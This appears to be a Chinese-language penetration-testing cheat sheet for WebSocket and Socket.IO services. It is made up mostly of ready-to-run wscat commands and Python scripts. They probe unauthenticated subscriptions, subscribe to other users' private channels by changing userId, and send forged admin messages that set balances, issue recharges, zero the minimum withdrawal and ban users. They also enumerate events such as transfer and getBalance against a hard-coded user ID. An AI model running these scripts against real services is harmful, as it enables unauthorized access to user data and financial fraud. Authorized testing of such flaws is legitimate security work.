## 1. 基础连接与消息抓取

```bash
# wscat 安装
npm install -g wscat

# 匿名连接（不带 token）
wscat -c "wss://目标/ws" --no-check

# 带 token 连接
wscat -c "wss://目标/ws" \
  -H "Authorization: Bearer eyJ..." \
  -H "Cookie: session=xxx"

# socket.io 连接
wscat -c "wss://目标/socket.io/?EIO=4&transport=websocket" --no-check
# 发送: 40   （socket.io 握手）
# 发送: 42["event_name",{"key":"value"}]
```

```python
import asyncio, websockets, json

async def sniff(url: str, token: str = ""):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    async with websockets.connect(url, extra_headers=headers, ssl=False) as ws:
        print("连接成功")
        async for msg in ws:
            print("收到:", msg[:500])

asyncio.run(sniff("wss://目标/ws"))
```

## 2. 越权测试矩阵

### 2.1 未授权订阅（无 token 连接）

```python
# ws_probe.py 已支持
python3 炼蛊房/ws_probe.py \
  --url wss://目标/ws \
  --case <案卷> \
  --probe-unauth
```

```python
# 手动：不带任何认证连接，看能收到什么
async def test_unauth():
    async with websockets.connect("wss://目标/ws", ssl=False) as ws:
        # 发送常见探针消息
        for probe in [
            '{"type":"subscribe","channel":"admin"}',
            '{"action":"getUserList"}',
            '{"cmd":"getBalance","userId":1}',
            '42["getUsers",{}]',   # socket.io 格式
        ]:
            await ws.send(probe)
            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3)
                print(f"发: {probe[:60]} → 收: {resp[:200]}")
            except asyncio.TimeoutError:
                print(f"发: {probe[:60]} → 超时/无响应")
```

### 2.2 水平越权（改 userId / roomId）

```python
# 用自己的 token 连接，但订阅他人的房间/数据
async def horizontal_privesc(my_token: str, target_user_id: int):
    async with websockets.connect("wss://目标/ws",
                                   extra_headers={"Authorization": f"Bearer {my_token}"},
                                   ssl=False) as ws:
        # 订阅目标用户的私有 channel
        await ws.send(json.dumps({
            "type": "subscribe",
            "userId": target_user_id,   # 改为他人 ID
            "channel": "private",
        }))
        resp = await asyncio.wait_for(ws.recv(), timeout=5)
        print("越权响应:", resp[:500])
```

### 2.3 垂直越权（普通用户发管理消息）

```python
admin_cmds = [
    {"type":"admin","action":"banUser","userId":99999},
    {"type":"system","cmd":"recharge","amount":10000,"userId":161487196},
    {"type":"admin","event":"setBalance","uid":161487196,"amount":99999},
    {"action":"updateConfig","key":"minWithdraw","value":0},
    {"event":"admin_broadcast","msg":"test"},
]
async def vertical_privesc(token: str):
    async with websockets.connect("wss://目标/ws",
                                   extra_headers={"Authorization": f"Bearer {token}"},
                                   ssl=False) as ws:
        for cmd in admin_cmds:
            await ws.send(json.dumps(cmd))
            try:
                r = await asyncio.wait_for(ws.recv(), timeout=3)
                if "error" not in r.lower() and "denied" not in r.lower():
                    print(f"⚠️ 可能命中: {cmd} → {r[:200]}")
            except:
                pass
```

## 4. Socket.IO 专项

```python
import socketio

sio = socketio.Client(ssl_verify=False)

@sio.event
def connect():
    print("连接成功")

@sio.on("*")
def catch_all(event, data):
    print(f"事件: {event} → {data}")

# 连接
sio.connect("https://目标",
            auth={"token": "eyJ..."},
            transports=["websocket"])

# 枚举常见事件
for evt in ["getBalance","getUserInfo","adminList","recharge","transfer","config"]:
    sio.emit(evt, {"userId": 161487196})
    import time; time.sleep(0.5)

sio.wait()
```

## 6. 消息格式速查

| 格式 | 特征 | 探针 |
|------|------|------|
| 纯 JSON | `{...}` | 直接改字段 |
| Socket.IO | `42["event",{...}]` | 42 开头 |
| Protobuf | 二进制 | 抓包 Burp 解码 |
| 自定义文本 | `CMD|param1|param2` | 按分隔符构造 |
| MessagePack | 二进制 JSON | `msgpack.unpackb(data)` |

```python
# MessagePack 解码
import msgpack
raw = b'\x82\xa4type\xa5admin\xa6userId\xcd\x03\xe8'
print(msgpack.unpackb(raw, raw=False))
```
